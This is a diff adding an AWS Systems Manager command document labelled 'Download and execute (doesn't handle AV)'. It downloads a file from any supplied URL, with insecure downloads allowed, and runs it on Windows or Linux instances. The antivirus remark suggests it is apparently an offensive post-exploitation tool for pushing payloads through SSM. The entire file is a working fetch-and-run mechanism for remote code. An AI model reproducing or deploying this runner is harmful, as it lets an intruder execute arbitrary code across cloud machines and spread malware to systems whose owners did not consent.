@@ -1,0 +1,54 @@
+{
+  "schemaVersion": "2.2",
+  "description": "Download and execute (doesn't handle AV)",
+  "parameters": {
+    "url": {
+      "description": "(Required) Full download URL.",
+      "type": "String"
+    },
+    "name": {
+      "description": "(Required) File's name",
+      "type": "String"
+    }
+  },
+  "mainSteps": [
+    {
+      "action": "aws:downloadContent",
+      "name": "download",
+      "inputs": {
+        "sourceType": "HTTP",
+        "sourceInfo": "{\"allowInsecureDownload\":true,\"url\":\"{{ url }}\"}"
+      }
+    },
+    {
+      "action": "aws:runPowerShellScript",
+      "name": "ExecuteWindows",
+      "precondition": {
+        "StringEquals": [
+          "platformType",
+          "Windows"
+        ]
+      },
+      "inputs": {
+        "runCommand": [
+          "./{{ name }}"
+        ]
+      }
+    },
+    {
+      "action": "aws:runShellScript",
+      "name": "ExecuteLinux",
+      "precondition": {
+        "StringEquals": [
+          "platformType",
+          "Linux"
+        ]
+      },
+      "inputs": {
+        "runCommand": [
+          "./{{ name }}"
+        ]
+      }
+    }
+  ]
+}
